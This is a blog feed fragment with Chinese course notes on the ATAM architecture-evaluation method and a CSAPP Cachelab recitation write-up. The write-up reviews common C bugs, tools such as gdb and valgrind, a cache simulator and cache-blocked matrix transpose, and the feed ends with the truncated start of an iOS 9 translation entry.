    <content type="html"><![CDATA[<p>这节课具体会介绍进行架构分析时候的一些权衡考量的方法，还是非常有用的（至少比前面两课那么『虚』的要好很多）。这里也会综合老师给出的阅读材料，争取给大家一个完整的概念。</p>
<a id="more"></a>
<hr>
<h2 id="u9636_u6BB5_u4E00_Evaluator__26amp_3B_Decision_Maker"><a href="#u9636_u6BB5_u4E00_Evaluator__26amp_3B_Decision_Maker" class="headerlink" title="阶段一 Evaluator &amp; Decision Maker"></a>阶段一 Evaluator &amp; Decision Maker</h2><h3 id="u7B2C_u4E00_u6B65_Present_ATAM"><a href="#u7B2C_u4E00_u6B65_Present_ATAM" class="headerlink" title="第一步 Present ATAM"></a>第一步 Present ATAM</h3><p>使用的技术有：</p>
<ul>
<li>Utility tree genration</li>
<li>Architecture elicitation and analysis</li>
<li>Scenario brainstorming / mapping</li>
</ul>
<p>这个阶段的产出有</p>
<ul>
<li>Architectural approaches</li>
<li>Utility tree</li>
<li>Scenarios</li>
<li>Risks and “non-risks”</li>
<li>sensitivity points and tradeoffs</li>
</ul>
<p><img src="/images/14558185071430.jpg" alt="ATAM 过程"></p>
<h3 id="u7B2C_u4E8C_u6B65_Present_Business_Drivers"><a href="#u7B2C_u4E8C_u6B65_Present_Business_Drivers" class="headerlink" title="第二步 Present Business Drivers"></a>第二步 Present Business Drivers</h3><p>顾客代表会描述：</p>
<ul>
<li>系统的商业 context</li>
<li>高层级的功能需求</li>
<li>高层级的质量需求</li>
</ul>
<blockquote>
<p>Architectural drivers: quality attributes that “shape” the architecture</p>
<p>Critical reirements: quality attributes most central to the system’s success</p>
</blockquote>
<p>具体来说包括：</p>
<ul>
<li>系统的关键功能</li>
<li>任何技术、管理、经济或政策的限制</li>
<li>商业目标和背景</li>
<li>主要的权益关系着</li>
<li>主要的质量目标(principla quality attribute, NFP)</li>
</ul>
<h3 id="u7B2C_u4E09_u6B65_Present_the_Architecture"><a href="#u7B2C_u4E09_u6B65_Present_the_Architecture" class="headerlink" title="第三步 Present the Architecture"></a>第三步 Present the Architecture</h3><p>展示系统的整体架构，可能包括：</p>
<ul>
<li>技术限制：操作系统、硬件、中间件</li>
<li>其他需要与之交互的系统</li>
<li>如何选择架构风格来达到质量要求</li>
</ul>
<p>这个阶段评估小组开始寻找可能的风险</p>
<h3 id="u7B2C_u56DB_u6B65_Identify_Architectural_Approaches"><a href="#u7B2C_u56DB_u6B65_Identify_Architectural_Approaches" class="headerlink" title="第四步 Identify Architectural Approaches"></a>第四步 Identify Architectural Approaches</h3><p>开始寻找那些在架构中堆达到质量目标举足轻重的关键点，了解比较常用的架构模型：</p>
<ul>
<li>Client-Server</li>
<li>3-tier</li>
<li>Proxy</li>
<li>Publish-Subscribe</li>
<li>Redundant hardware</li>
</ul>
<h3 id="u7B2C_u4E94_u6B65_Generate_Utility_Tree"><a href="#u7B2C_u4E94_u6B65_Generate_Utility_Tree" class="headerlink" title="第五步 Generate Utility Tree"></a>第五步 Generate Utility Tree</h3><p>通过构造 utility tree 来进一步优化改进重要的质量目标</p>
<ul>
<li>Utility tree 是一个自顶向下的方法，来驱动属性相关的需求</li>
<li>高层级节点应当是最重要的质量目标（如 performance, modifiability, security 和 availability）</li>
<li>场景是 utility tree 的叶子</li>
</ul>
<p><img src="/images/14558198859387.jpg" alt="一个 utility tree 的例子"></p>
<p><strong>Scenarios</strong></p>
<p>用来展示利益相关者的兴趣所在，便于理解质量需求，应当包括</p>
<ul>
<li>Anticipated uses of (use case scenarios)</li>
<li>Anticipated changes to (growth scenarios)</li>
<li>Unanticipated stresses (exploratory scenarios)</li>
</ul>
<p><img src="/images/14558199929846.jpg" alt="ATAM Scenarios"></p>
<p><img src="/images/14558200171596.jpg" alt="Scenario 的例子"></p>
<h3 id="u7B2C_u516D_u6B65_Analyze_Architectural_Approaches"><a href="#u7B2C_u516D_u6B65_Analyze_Architectural_Approaches" class="headerlink" title="第六步 Analyze Architectural Approaches"></a>第六步 Analyze Architectural Approaches</h3><p>评估小组从特定的质量目标的角度入手，了解架构及识别可能的风险：</p>
<ul>
<li>找到那些保证质量需求的方法</li>
<li>提出相关问题</li>
<li>识别出 risks, non-risks, sensitivity points 和 tradeoffs</li>
</ul>
<p>下面是一些例子：</p>
<p><img src="/images/14558202021169.jpg" alt="可能的问题"></p>
<p><img src="/images/14558202227194.jpg" alt="Sensitivity &amp; Tradeoffs"></p>
<p><img src="/images/14558202695271.jpg" alt="Risk &amp; Non-Risks"></p>
<h3 id="u6700_u540E_u51E0_u6B65"><a href="#u6700_u540E_u51E0_u6B65" class="headerlink" title="最后几步"></a>最后几步</h3><ul>
<li>第七步 Brainstom &amp; Prioritize Scenarios<ul>
<li>利益相关者头脑风暴，相关过程</li>
</ul>
</li>
<li>第八步 Analyze Architectural Approaches<ul>
<li>重复第六步中的工作</li>
</ul>
</li>
<li>第九步 Present ATAM results<ul>
<li>完整的产出</li>
<li>Architectural appoaches</li>
<li>Utility tree</li>
<li>Scenarios</li>
<li>Risks and Non-risks</li>
<li>Sensitivity points and tradeoffs</li>
</ul>
</li>
</ul>
<h3 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h3><ul>
<li>架构分析既不简单也不便宜</li>
<li>从长远来看，利大于弊</li>
<li>关于系统核心特性的早期信息非常重要</li>
<li>应当使用多种分析技术</li>
<li>到底需要分析到什么程度？<ul>
<li>这是架构师最需要琢磨的地方</li>
<li>分析过多，则会无谓消耗有限的资源</li>
<li>分析过少，则会面临系统失败的风险</li>
<li>错误的分析既浪费资源，又可能导致系统失败</li>
</ul>
</li>
</ul>
<h2 id="u9605_u8BFB_u6750_u6599_u7B14_u8BB0"><a href="#u9605_u8BFB_u6750_u6599_u7B14_u8BB0" class="headerlink" title="阅读材料笔记"></a>阅读材料笔记</h2><ul>
<li>云计算部分非常简略，建议参考我的云计算课程笔记</li>
<li>使用 ATAM 来评估一个架构时，目标是理解不同的架构决定对系统质量可能带来的影响，所以可以看作是一个风险识别的方法</li>
<li>实际上是根据不同的属性和资源提出对应的问题，并找出相互的影响</li>
<li>三个场景：use case scenarios, growth scenarios, exploratory scenarios</li>
<li>不同的场景有不同的侧重点和要求，具体可以结合下图的实例来理解体会</li>
</ul>
<p><img src="/images/14558122473154.jpg" alt="Use Case Scenarios"></p>
<p><img src="/images/14558122635076.jpg" alt="Growth Scenarios"></p>
<p><img src="/images/14558122890374.jpg" alt="Exploratory Scenarios"></p>
<ul>
<li>Utility tree 和 Facilitated brainstorm 是两种常见的方式，各有不同的侧重</li>
</ul>
<p><img src="/images/14558123943034.jpg" alt="Utility Trees vs. Scenario Brainstorming"></p>
<p><img src="/images/14558124405619.jpg" alt="一个 Utility Tree 的例子"></p>
<ul>
<li>ATAM 过程结束后的产出有<ul>
<li>Risk and Non-Risks 文档，用来分析各个架构决定的风险性</li>
<li>Sensitivity and Tradeoff Points 文档，用来具体说明不同权衡的利弊（最重要的部分）</li>
<li>A Structure for Reasoning 文档，用来说明具体的架构选择及其原因</li>
</ul>
</li>
</ul>
<p><img src="/images/14558126249185.jpg" alt="Concept Interactions"></p>
<ul>
<li>评测中的重要属性<ul>
<li>Availability, Modifiability, Performance, Security, Usability</li>
<li>Deployment, Locating, Errors, Cost/Effort Estimation, Personalization, Safety</li>
</ul>
</li>
<li>可能的风险来源<ul>
<li>Risks Due to Unknowns</li>
<li>Risks Due to Side Effects of Architectural Decisions</li>
<li>Risks Due to Ignoring Architectural Solutions to Attribute Requirements</li>
<li>Risks Due to Interaaction with Other Organizations</li>
</ul>
</li>
<li>具体步骤<ul>
<li>Background</li>
<li>Business and Mission Drivers</li>
<li>Architectural Approaches</li>
<li>Utility Tree</li>
<li>Scenario Generation and Prioritization</li>
<li>Analysis Process</li>
<li>Post-ATAM Activities </li>
</ul>
</li>
</ul>
<p>感觉还是有点虚，估计作业就是模仿阅读材料完成一次具体的 ATAM 分析，但是老师给出的参考作业的内容又是关于 SOA 的，真的很令人费解。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这节课具体会介绍进行架构分析时候的一些权衡考量的方法，还是非常有用的（至少比前面两课那么『虚』的要好很多）。这里也会综合老师给出的阅读材料，争取给大家一个完整的概念。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="架构" scheme="http://wdxtub.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="设计" scheme="http://wdxtub.com/tags/%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 习题课 4 Cachelab]]></title>
    <link href="http://wdxtub.com/2016/02/17/csapp-lab4/"/>
    <id>http://wdxtub.com/2016/02/17/csapp-lab4/</id>
    <published>2016-02-17T17:33:35.000Z</published>
    <updated>2016-02-18T04:27:28.000Z</updated>
    <content type="html"><![CDATA[<p>这节课我们来讲讲第四次作业，主要会尽可能利用缓存来加速计算，不过在开始作业之前会先复习一下 C 语言。</p>
<a id="more"></a>
<hr>
<h2 id="C__u8BED_u8A00_u590D_u4E60"><a href="#C__u8BED_u8A00_u590D_u4E60" class="headerlink" title="C 语言复习"></a>C 语言复习</h2><ul>
<li>注意代码风格，不要写糟糕的代码</li>
<li>小心隐式类型转换</li>
<li>小心未定义的行为</li>
<li>小心内存泄露</li>
<li>宏和指针计算很容易出错</li>
</ul>
<p><strong>例 1</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (u &gt; -<span class="number">1</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为 <code>u</code> 是无符号整型，所以在比较的时候 -1 也会按照无符号整型来处理，于是实际的比较相当于 <code>u &gt; int_max</code>，使得这个函数总是会返回 0。</p>
<p><strong>例 2</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* a = <span class="built_in">malloc</span>(<span class="number">100</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        a[i] = i / a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里 <code>a</code> 中的值都没有进行初始化，所以 main 函数的行为是未定义的。</p>
<p><strong>例 3</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> w[strln(<span class="string">"C programming"</span>)];</span><br><span class="line">    <span class="built_in">strcpy</span>(w, <span class="string">"C programming"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, w);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>strlen</code> 返回的长度是不包括最后的 <code>\0</code> 的，写入的时候会越界。</p>
<p><strong>例 4</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ht_node &#123;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> ht_node* node;</span><br><span class="line"></span><br><span class="line"><span class="function">node <span class="title">makeNnode</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    node curr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    curr-&gt;key = k;</span><br><span class="line">    curr-&gt;data = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里把 <code>node</code> 定义为一个指针，并不是指向一个结构体。</p>
<p><strong>例 5</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcdup</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dup[n+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        dup[i] = c;</span><br><span class="line">    dup[i] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">char</span> *A = dup;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>strcdup</code> 函数返回了一个分配在栈中的指针，函数返回之后地址 <code>A</code> 可能会被抹掉。</p>
<p><strong>例 6</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> IS_GREATER(a, b) a &gt; b</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">isGreater</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m1 = IS_GREATER(<span class="number">1</span>, <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> m2 = isGreater(<span class="number">1</span>, <span class="number">0</span>) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>IS_GREATER</code> 是一个没有带括号的宏，所以 <code>m1</code> 的值相当于 <code>1 &gt; 0+1 = 0</code></p>
<p><strong>例 7</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NEXT_BYTE(a) ((char *)(a + <span class="number">1</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a1 = <span class="number">54</span>; <span class="comment">// &amp;a1 = 0x100</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a2 = <span class="number">42</span>; <span class="comment">// &amp;a2 = 0x200</span></span><br><span class="line"><span class="keyword">void</span>* b1 = NEXT_BYTE(&amp;a1);</span><br><span class="line"><span class="keyword">void</span>* b2 = NEXT_BYTE(&amp;a2);</span><br></pre></td></tr></table></figure>
<ul>
<li>这里 <code>b1</code> 指向 <code>0x104</code></li>
<li>这里 <code>b2</code> 指向 <code>0x208</code></li>
</ul>
<p>会根据类型的不同，决定下一个 byte 的起始位置。</p>
<p>注意提交的代码列数不要超过 80，会人工检查的。</p>
<p><strong>GDB 命令</strong></p>
<ul>
<li><code>gdbtui &lt;binary&gt;</code></li>
<li><code>layout split</code></li>
</ul>
<p><img src="/images/14557338869148.jpg" alt=""></p>
<p><strong>valgrind</strong></p>
<p>可以用来查找</p>
<ul>
<li>内存泄露</li>
<li>其他内存错误</li>
<li>内存损害</li>
</ul>
<p>使用 <code>gcc -g</code> 可以列出内存泄露的具体行数</p>
<p>使用 <code>valgrind --leak-check=full</code> 可以查看全部详细信息</p>
<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>先下载好试验的压缩包，然后上传到学校的主机上：<code>scp cachelab-handout.tar dawang@shark.ics.cs.cmu.edu:~/513</code></li>
<li>接着 ssh 过去：<code>ssh -X dawang@shark.ics.cs.cmu.edu</code></li>
<li>解压：<code>tar -xvf cachelab-handout.tar</code></li>
</ul>
<p>然后就可以看到这次作业的内容了：</p>
<p><img src="/images/14557441434948.jpg" alt=""></p>
<p>我们需要修改的是 <code>csim.c</code>（需要自己创建） 和 <code>trans.c</code>。这里我会把这两个文件传回本地进行修改，完成后再传到服务器上进行测试：</p>
<ul>
<li>服务器至本地<ul>
<li><code>scp dawang@shark.ics.cs.cmu.edu:~/513/cachelab-handout/csim.c ./</code></li>
<li><code>scp dawang@shark.ics.cs.cmu.edu:~/513/cachelab-handout/trans.c ./</code></li>
</ul>
</li>
<li>本地至服务器<ul>
<li><code>scp csim.c dawang@shark.ics.cs.cmu.edu:~/513/cachelab-handout/</code></li>
<li><code>scp trans.c dawang@shark.ics.cs.cmu.edu:~/513/cachelab-handout/</code></li>
</ul>
</li>
</ul>
<p>编译的时候只需要简单 <code>make clean</code> 和 <code>make</code>，然后就可以进行测试了。</p>
<h2 id="u7B2C_u4E00_u90E8_u5206__u7F13_u5B58_u6A21_u62DF_u5668"><a href="#u7B2C_u4E00_u90E8_u5206__u7F13_u5B58_u6A21_u62DF_u5668" class="headerlink" title="第一部分 缓存模拟器"></a>第一部分 缓存模拟器</h2><p>这里需要注意的是，缓存模拟器并不是缓存！我们不需要存储具体的内存内容，也就是说，块偏移量不重要（也就是最后的 b bits 我们不需要在意），只需要计算 hit, miss 和 eviction 的次数即可。</p>
<p>这一部分内容具体理解请参阅 <a href="http://wdxtub.com/2016/02/15/csapp-12/">第 12 课 Cache Memories</a>，这里不再赘述，如果弄懂了这篇日志里的内容，应该就没有问题。</p>
<p>我们的缓存模拟器需要在不同的 s, b, E 设定下正常工作，使用的替换策略是 LRU(Least Recently Used)，这里可以考虑用队列或者时间戳的方式来记录。</p>
<h3 id="u4EFB_u52A1_u76EE_u6807"><a href="#u4EFB_u52A1_u76EE_u6807" class="headerlink" title="任务目标"></a>任务目标</h3><p>因为这次作业可能重复性比较高，所以这里就不贴代码了。主要讲一下每个步骤以及遇到问题时的解决思路。</p>
<p>先来了解一下这次用作输入数据的 trace 文件，可以使用 <code>valgrind --log-fd=1 --tool=lackey -v --trace-mem=yes ls -l</code> 来体验一下，具体做的事情，就是把执行 <code>ls -l</code> 这个命令时访问内存的日志输出到终端中，大概是这样的：</p>
<p><img src="/images/14557449805626.jpg" alt=""></p>
<p>每一条对内存访问的记录格式是 <code>[空格]操作符 地址,大小</code>，以 <code>I</code> 开头的是载入指令的记录，不算在内存访问中。</p>
<ul>
<li>M 表示数据修改，需要一次载入 + 一次存储，也就是相当于两次访问</li>
<li>S 表示数据存储</li>
<li>L 表示数据载入</li>
<li>地址指的是一个 64 位的 16 进制内存地址</li>
<li>大小表示该操作内存访问的字节数</li>
</ul>
<p>我们要做的实际是读入 <code>valgrind</code> 生成的 trace 日志，并统计出 hit, miss 和 eviction 的次数。同时已经给出了一个参考程序 <code>csim-ref</code>，于是任务就变成山寨一个这样的程序，比如：</p>
<p><img src="/images/14557460323055.jpg" alt="注意两种不同的模式"></p>
<p>具体用法如下：</p>
<p><img src="/images/14557462175638.jpg" alt="注意各个参数的含义"></p>
<p>其他的就是概念的理解和实现了，这里给出几个关键问题，大家可以从这里找到思路：</p>
<ol>
<li>如何从命令中拿到所需的参数</li>
<li>如何从文件中读入内容</li>
<li>如何进行 cache 的存储</li>
<li>如何进行错误处理</li>
<li>如何保证两种模式输出</li>
</ol>
<p>因为已经给出了参考输出，所以对着一点一点做，应该没有太多问题。</p>
<h3 id="u4E00_u4E9B_u63D0_u793A"><a href="#u4E00_u4E9B_u63D0_u793A" class="headerlink" title="一些提示"></a>一些提示</h3><p>我们可以用一个 <code>cache_line</code> 的结构体来保存每个 cache line 的信息，如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> valid;</span><br><span class="line">    <span class="keyword">int</span> tag;</span><br><span class="line">    <span class="keyword">int</span> time_stamp;</span><br><span class="line">&#125; cache_line;</span><br></pre></td></tr></table></figure>
<p>而对应到我们的缓存模拟器，可以用一个二维数组来存储并模拟，如：<code>cache[S][E]</code>。这里 $S=2^s$，也就是 set 的个数，E 是一个 set 里有多少个 cache line。</p>
<p>因为这次测试的输入是如下所示的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./csim [-hv] <span class="operator">-s</span> &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br></pre></td></tr></table></figure>
<p>也就是说我们的程序需要能够读取命令行参数。这时候可以使用 <code>getopt()</code> 来完成，使用前注意包括 <code>#include &lt;unistd.h&gt;</code>，如果不在 CMU 的机器上运行，还需要加上 <code>#include &lt;getopt.h&gt;</code>。</p>
<p>具体的使用方法参见 <code>man 3 getopt</code> 或 <a href="http://www.gnu.org/software/libc/manual/html_node/Getopt.html" target="_blank" rel="external">这里</a>。当然，还需要考虑如何处理非法输入。一个简单的例子，对于命令 <code>./foo -x 1 -y 3</code>，可以这样解析：</p>
<p><img src="/images/14557375929445.jpg" alt=""></p>
<p>有了命令行参数，我们还需要对应读入 trace 文件的内容，可以使用 <code>fscanf</code> 来完成这个任务，具体的使用可以参考 <code>man fscanf</code> 或 <a href="http://crasseux.com/books/ctutorial/fscanf.html" target="_blank" rel="external">这里</a>，一个例子：</p>
<p><img src="/images/14557377045267.jpg" alt=""></p>
<p>因为我们需要根据传入的参数来创建 cache，所以需要动态分配空间，可以使用 <code>malloc</code> 在堆上完成这个任务。但是需要注意 <code>malloc</code> 的内容一定要 <code>free</code> 掉，不然就会造成内存泄露。另外，不是自己 <code>malloc</code> 的内存，也不要去 <code>free</code> 掉。一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">some_pointer_you_malloced = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">Free(some_pointer_you_malloced);</span><br></pre></td></tr></table></figure>
<h2 id="u7B2C_u4E8C_u90E8_u5206__u4F18_u5316_u77E9_u9635_u8F6C_u5236"><a href="#u7B2C_u4E8C_u90E8_u5206__u4F18_u5316_u77E9_u9635_u8F6C_u5236" class="headerlink" title="第二部分 优化矩阵转制"></a>第二部分 优化矩阵转制</h2><h3 id="u4EFB_u52A1_u76EE_u6807-1"><a href="#u4EFB_u52A1_u76EE_u6807-1" class="headerlink" title="任务目标"></a>任务目标</h3><p>测试的矩阵尺寸为：</p>
<ul>
<li>32 x 32</li>
<li>64 x 64</li>
<li>61 x 67</li>
</ul>
<p>缓存的指标：</p>
<ul>
<li>有 1KB 大小的缓存</li>
<li>是 directly mapped，也就是 E=1</li>
<li>Block size 为 32 字节，也就是 b=5</li>
<li>一共有 32 个 set，也就是 s=5</li>
</ul>
<p>可能出乎大家意料，最困难的其实是 64 x 64，因为对于 miss 数量的要求非常严苛！</p>
<h3 id="u7F13_u5B58_u5206_u6790"><a href="#u7F13_u5B58_u5206_u6790" class="headerlink" title="缓存分析"></a>缓存分析</h3><p>为了加深印象，还是具体分析一下使用的策略。61 x 67 因为不规则，所以基本的策略就是用不同的分块大小去试验，我一路从 8 测试到 24，最后选了个看起来最顺眼的。这里主要还是分析 32 x 32 和 64 x 64 的。</p>
<p>根据给出的缓存大小，可以知道，一个 block 可以放 8 个 int 值，那么对于 32 x 32 矩阵，有下面的图：</p>
<p><img src="/images/14557681819928.jpg" alt="32 x 32"></p>
<p>这里的数字表示对应的值会存在缓存的哪个 set 中，我们可以看到第九行和第一行会冲突，但是如果我们分成 8 x 8 的小块，就可以保证尽可能利用到缓存的特性（读取第 1 个的时候后面 7 个也已经载入缓存中），于是简单分块就可以解决 32 x 32 的矩阵（要求是 miss 数量不超过 300）</p>
<p>但是对于 64 x 64，情况就不一样了，首先是 miss 的数量限制得比较严格，不超过 1300，然后是缓存中的排列也有一些变化，如图：</p>
<p><img src="/images/14557683448384.jpg" alt="64 x 64"></p>
<p>因为宽度的变化，现在第 5 行就会和第 1 行冲突，所以如果我们还用原来的 8 x 8，肯定是不行的。那么如果用 4 x 4 呢？经过尝试之后，发现超过要求的 1300 还是比较多的。问题在哪里？一是因为每次读取 4 个数字，我们实际只用了 4 个，二是宽度改变带来的 conflict miss 仍旧没有很好解决。</p>
<p>题目中说不能使用超过 12 个变量，有 4 个需要作为遍历矩阵的索引值，另外八个是不是可以做一点文章呢？答案是肯定的。</p>
<p>我们依然可以按照原来的 8 x 8 来进行处理，只是在每个 8 x 8 中，还需要进行分块。首先是左上角的 4 x 4，这里没有冲突，都会在缓存中，所以按照正常的分块算法处理。比较有技巧的是右上角和左下角，这里我们会发现重复访问会造成很多的 conflict miss，这个时候就可以利用 4 个本地变量作为 buffer，先存起来，以后再用。这样就利用了每次读入 8 个的优势，并且避开了因为地址冲突而导致的 conflict miss 的问题。</p>
<h3 id="u4E00_u4E9B_u63D0_u793A-1"><a href="#u4E00_u4E9B_u63D0_u793A-1" class="headerlink" title="一些提示"></a>一些提示</h3><p>矩阵转制并不是特别复杂的操作，但是如何利用缓存来尽可能提高速度，就有很多的优化空间了。和矩阵相乘中使用的 cache blocking 方法一样，在这里我们同样可以利用 blocking 的方法来提高效率，可能需要尝试不同的大小，以找到最合适的尺寸。</p>
<p>最好在编译的时候加上 <code>-Werror</code>，这样就不会放过任何一个 warning。如果使用的函数缺少头文件，可以通过 <code>man &lt;function-name&gt;</code> 找到相关头文件</p>
<p>因为只会跑 32x32, 64x64, 61x67 这三个测试，所以可以硬编码来进行检测，针对不同的矩阵大小进行优化。</p>
<p>都写完之后可以利用 <code>./driver.py</code> 进行完整的测试，最后提交自动打包好的 tar 压缩包到 autolab 即可。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>被汇编语言虐了两周之后，回过头来写 C 语言，真的感觉从地狱到了天堂。虽然降低了语言的复杂度，但是对于概念的理解有了更高的要求。回过头来想想，正因为隐藏了足够多的细节，更高层级的抽象才得以方便实现。</p>
<p>缓存的整个设计非常精妙，仅仅利用 locality 一个特性，几乎是用最小的成本达到了最好的性能。</p>
<blockquote>
<p>The memory hierarcy creates a large pool of storage that costs as much as the cheap storage near the bottom, but that serves data to programs at the rate of the fast storage near the top.</p>
</blockquote>
<p>带着镣铐跳舞，精髓。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这节课我们来讲讲第四次作业，主要会尽可能利用缓存来加速计算，不过在开始作业之前会先复习一下 C 语言。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="Cachelab" scheme="http://wdxtub.com/tags/Cachelab/"/>
    
      <category term="习题课" scheme="http://wdxtub.com/tags/%E4%B9%A0%E9%A2%98%E8%AF%BE/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Programming iOS9 翻译 9 - iPad Interface]]></title>
    <link href="http://wdxtub.com/2016/02/17/programming-ios9-translation-9/"/>
    <id>http://wdxtub.com/2016/02/17/programming-ios9-translation-9/</id>
    <published>2016-02-17T11:59:39.000Z</published>
    <updated>2016-02-17T15:47:16.000Z</updated>
    <content type="html"><![CDATA[<p>这一章主要讨论 iPad 和 iPhone 在界面特性上的一些不同。Popover 和 split view 是原生为 iPad 设计的界面，在 iOS8 之前都只能在 iPad 上使用，但是现在也可以在 iPhone 上应用。另一个值得注意的是 iPad 多任务功能。</p>
<a id="more"></a>
<hr>
<h2 id="Popovers"><a href="#Popovers" class="headerlink" title="Popovers"></a>Popovers</h2>]]></content>
    <summary type="html">
    <![CDATA[<p>这一章主要讨论 iPad 和 iPhone 在界面特性上的一些不同。Popover 和 split view 是原生为 iPad 设计的界面，在 iOS8 之前都只能在 iPad 上使用，但是现在也可以在 iPhone 上应用。另一个值得注意的是 iPad 多任务功能。</p>]]>
    
    </summary>
    
